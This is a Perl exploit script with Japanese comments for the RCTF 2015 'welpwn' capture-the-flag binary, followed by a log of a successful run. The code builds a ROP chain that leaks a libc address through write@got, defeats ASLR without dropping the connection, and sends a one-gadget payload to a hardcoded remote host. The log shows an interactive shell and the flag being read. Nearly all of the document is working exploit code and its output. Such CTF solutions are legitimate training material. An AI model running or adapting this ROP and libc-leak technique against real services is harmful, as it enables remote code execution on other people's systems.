#!/usr/bin/perl
#
# RCTF 2015 Quals - welpwn 200
#
# Copyright (c) 2014-2019 gpp256
# This software is distributed under the MIT License.

use pwntools;
use Time::HiRes qw (usleep);

# Initialize
$pwntools::ARCH = '64';

$buf = "A" x 24;          # padding
$buf.= p(0x40089c);       # pop4ret★この問題特有の処理、gdbでアタッチして確認すると分かる
$buf.= p(0x40089a);       # pop6ret
$buf.= p(0x1);            # rbx
$buf.= p(0x2);            # ★連続実行したい場合は2を指定
$buf.= p(0x601020-8);     # r12=バッファの先頭-8 # write@got★pltではない
$buf.= p(32);             # r13 = arg3
$buf.= p(0x601020);       # r14 = arg2
$buf.= p(1);              # r15 = arg1
$buf.= p(0x400880);       # mov  rdx,r13

$buf.= p(0x4008a2) x $ARGV[0]; # $ARGV[0]= 7; add rsp,0x8 + pop6ret
$buf.= p(0x400630) x 1; # _start★ASLR有効のため、接続を切らずに攻めきる

$write_offset = 0xeb860; # remote
$rce_offset = 0x4652c; # remote

# Main
#&connect(\$s, 'localhost', 5000) or die "ng";
&connect(\$s, '180.76.178.48', 6666) or die "ng";
usleep(100000);
sysread($s, $data, 0x100); print $data;
syswrite($s, $buf, length($buf));
usleep(1000000);
sysread($s, $data, 100);
printf("[+] buf: %s", unpack("H*", $data));
$libc_base = u(substr($data,0,8))-$write_offset;
$rce_addr = $libc_base + $rce_offset;
printf("[+] libc_base = 0x%016x\n", $libc_base);
printf("[+] rce_addr = 0x%016x\n", $rce_addr);

$buf = "A" x 24;          # padding
$buf.= p($rce_addr);      # One-Gadget-RCE
$buf.= "A" x (8*2);       # 環境変数微調整 =  execve(2)の第二引数の調整
$buf.= p(0x0);             
syswrite($s, $buf, length($buf));
usleep(1000000);
&interact($s);
exit;
__END__

# perl try.pl 7
Welcome to RCTF
[+] buf: 60a8c515517f00000034bc15517f0000d0fcc215517f000000a8c515517f000057656c636f6d6520746f20524354460a4141414141414141414141414141414141414141414141419c0840id
[+] libc_base = 0x00007f5115b6f000
[+] rce_addr = 0x00007f5115bb552c
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
find /home/ctf
/home/ctf
/home/ctf/flag
/home/ctf/welpwn
/home/ctf/.bashrc
/home/ctf/.bash_logout
/home/ctf/.profile
cat /home/*/flag
RCTF{W3LC0M3GUYS_Enjoy1T}★フラグ奪取成功

